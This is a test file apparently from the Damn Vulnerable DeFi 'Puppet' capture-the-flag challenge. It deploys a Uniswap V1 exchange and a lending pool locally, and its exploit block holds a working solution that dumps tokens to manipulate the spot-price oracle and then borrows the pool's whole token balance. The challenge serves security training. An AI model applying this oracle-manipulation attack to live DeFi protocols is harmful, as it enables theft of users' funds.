const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
// tokensSold: number of tokens to be traded 
// tokensInReserve: number of tokens in the Uniswap pool
// etherInReserve: number of ETH in the Uniswap pool
// fee: 0.3% 
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10'); // DVT
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10'); // ETH

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        const a = calculateTokenToEthInputPrice(
            ethers.utils.parseEther('1'),
            UNISWAP_INITIAL_TOKEN_RESERVE,
            UNISWAP_INITIAL_ETH_RESERVE
        )
        
        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
        
        console.log(
            'Oracle price intially set to 1 DVT = 1 ETH', 
            String(await this.lendingPool._computeOraclePrice())
        )
        expect(await this.lendingPool._computeOraclePrice()).to.be.eq(ethers.utils.parseEther('1'))
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        console.log('Attacker initial DVT balance: ', ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));  // 1000 DVT
        
        // approve the uniswap exchange contract to transfer DVTs on attacker's behalf
        await this.token.connect(attacker).approve(
            this.uniswapExchange.address,
            ATTACKER_INITIAL_TOKEN_BALANCE
            // ethers.utils.parseEther('1')
        );
        console.log('ETH balance before the swap: ', ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)))
        console.log('DVT balance before the swap: ', ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)))
        // 1. Attacker sell 1000 DVT for ETH on DVT-ETH exchange (-> this will decrease the price of DVT relative to ETH) 
        console.log('>>>>>>>> Attacker sell 1000 DVT for ETH on DVT-ETH exchange')
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
            // ATTACKER_INITIAL_TOKEN_BALANCE - 1,
            ethers.utils.parseEther('999'), // 1 subtracted because `to.be.gt(POOL_INITIAL_TOKEN_BALANCE);` 
            1, // this cannot be 0 
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { gasLimit: 1e6 }
        )
        
        console.log('Uniswap ETH balance after the swap: ', ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)))
        console.log('Uniswap DVT balance after the swap: ', ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)))

        // Now the ratio is 0.000098516632405915...
        console.log(
            'Oracle price after selling 1000 DVT for ETH: ', 
            ethers.utils.formatEther(await this.lendingPool._computeOraclePrice())
        )
        // expect(await this.lendingPool._computeOraclePrice()).to.be.eq('98321649443991')
        
        console.log('Attacker DVT balance: ', ethers.utils.formatEther(await this.token.balanceOf(attacker.address))); // 0 DVT
        const balance = await ethers.provider.getBalance(attacker.address);

        // Attacker's ether balance increased from 25ETH -> 35ETH
        console.log(`Attacker ETH balance: ${ethers.utils.formatEther(balance)}`); // 35 ETH
        
        const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log('Deposit required to buy all DVTs: ', ethers.utils.formatEther(depositRequired)); // 20 ETH
        
        console.log('>>>>>>> Use the ETH received to borrow all DVTs from the pool')
   
        // 2. Use the ETH received to borrow all DVTs from the pool
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {
            value: depositRequired,
        });
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});